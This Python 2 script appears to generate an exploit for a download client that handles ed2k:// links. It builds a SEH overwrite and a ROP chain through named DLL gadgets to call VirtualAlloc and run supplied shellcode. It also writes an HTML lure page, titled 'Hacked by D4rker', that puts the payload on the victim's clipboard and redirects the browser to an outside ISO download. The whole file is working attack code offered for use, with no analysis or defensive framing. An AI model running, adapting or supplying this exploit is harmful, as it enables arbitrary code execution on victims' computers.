import sys
import struct


def p32(addr):
    tmp = struct.pack(">I", addr).encode("hex")
    return (u"\\u%s\\u%s" % (tmp[4:], tmp[:4])).decode("unicode-escape").encode("utf-8")


def pSC(shellcode):
    sc = ""
    # pad
    if len(shellcode) % 2:
        shellcode += "\x90"
    # utf-8 encode
    for i in range(len(shellcode) / 2):
        data = shellcode[i * 2: i * 2 + 2].encode("hex")
        sc += (u"\\u%s%s" % (data[2:4], data[:2])).decode("unicode-escape").encode("utf-8")

    return sc


def genExp(shellcode):
    length = 0x200c
    paddingLength = 0x592
    url = ""

    # padding
    url += "A" * paddingLength

    # ropchain
    rop = (
        p32(0x215b4e2e),                # POP ECX # POP EDI # RETN [BaseCommunity.DLL]
        p32(0x10101050),                # ECX
        p32(0x10101010),                # EDI
        p32(0x215e6c1d),                # SUB ECX, EDI # ADD EAX, ECX # POP EDI # POP ESI # RET 4 [BASECOMMUNITY.DLL]
        p32(0x41414141),
        p32(0x41414141),
        p32(0x10016db8),                # POP EDX # RETN [XLFSIO.dll]
        p32(0x41414141),
        p32(0x215ef118),                # ptr to &VirtualAlloc() [IAT BaseCommunity.DLL]
        p32(0x2c5a8ba2),                # MOV EAX, DWORD PTR DS:[EDX] # RETN [zlib1.dll]
        p32(0x2c5a39c8),                # PUSH EAX # POP ESI # POP EDI # POP EBX # RETN [zlib1.dll]
        p32(0x41414141),
        p32(0x41414141),
        p32(0x21d1c415),                # POP EBP # RETN [libexpat.dll]
        p32(0x21d2b41b),                # & JMP ESP [libexpat.dll]
        p32(0x100161fd),                # POP EAX # RETN [XLFSIO.dll] 
        p32(0xa401bc74),                # put delta into EAX (-> put 0x000001000 into EBX)
        p32(0x2c5a3396),                # ADD EAX, 5BFE438D # RETN [zlib1.dll]
        p32(0x21d09023),                # XCHG EAX, EBX # RETN [libexpat.dll]
        p32(0x100161fd),                # POP EAX # RETN [XLFSIO.dll]
        p32(0xa401cc73),                # put delta into EAX (-> put 0x00001000 into EDX)
        p32(0x2c5a3396),                # ADD EAX, 5BFE438D # RETN [zlib1.dll]
        p32(0x21d58025),                # XCHG EAX, EDX # RETN [libexpat.dll]
        p32(0x21d067c3),                # POP EDI # RETN [libexpat.dll]
        p32(0x1001c604),                # RETN (ROP NOP) [XLFSIO.dll]
        p32(0x100161fd),                # POP EAX # RETN [XLFSIO.dll]
        pSC("\x83\xc4\x04\x90"),        # ADD ESP, 4 # NOP
        p32(0x2c5a3c49)                 # PUSHAD # RETN [zlib1.dll]
    )
    for i in rop:
        url += i

    # shellcode
    url += pSC(shellcode)

    # padding
    url += "C" * ((length - 2 * paddingLength - 4 * len(rop) - len(shellcode)) / 2)

    # overwrite seh
    url += p32(0x41414141)
    url += p32(0x2c5a35ce)              # stack pivot; ADD ESP, 1004 # RETN [zlib1.dll]

    # rubbish
    url += "D" * 0x100

    # end
    url = "ed2k://|file|" + url + "|203119399|35FF36F97812DF36F9BD60C7A295D047|/"

    return url


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print "Usage: {} shellcode.bin".format(sys.argv[0])
        exit(1)

    # exp.txt
    with open(sys.argv[1]) as shellcode:
        with open("exp.txt", "w") as expTxt:
            expTxt.write(genExp(shellcode.read()))
    print "=> exp.txt"
    with open("exp.txt") as expTxt:
        with open("exp.html", "w") as expHtml:
            expHtml.write('''<!DOCTYPE html>
<html>
<head>
    <title>Hacked by D4rker</title>
    <meta charset="utf-8">
</head>
    <body>
        <button id="exp" class="btn" data-clipboard-text="''')
            expHtml.write(expTxt.read())
            expHtml.write('''">bang!</button>

        <!-- 2. Include library -->
        <script src="https://cdn.jsdelivr.net/npm/clipboard@1/dist/clipboard.min.js"></script>

        <!-- 3. Instantiate clipboard by passing a string selector -->
        <script>
        var clipboard = new Clipboard('.btn');
        clipboard.on('success', function(e) {
            console.log('success', e);
            // location.href = "thunder://";
            location.href = "http://xp1.xitongxz.net:808/201707/DEEP_GHOST_XP_SP3_V2017_07.iso";
        });
        clipboard.on('error', function(e) {
            console.log('error', e);
        });

        // document.getElementById("exp").click();

        </script>
    </body>
</html>''')
    print "=> exp.html"
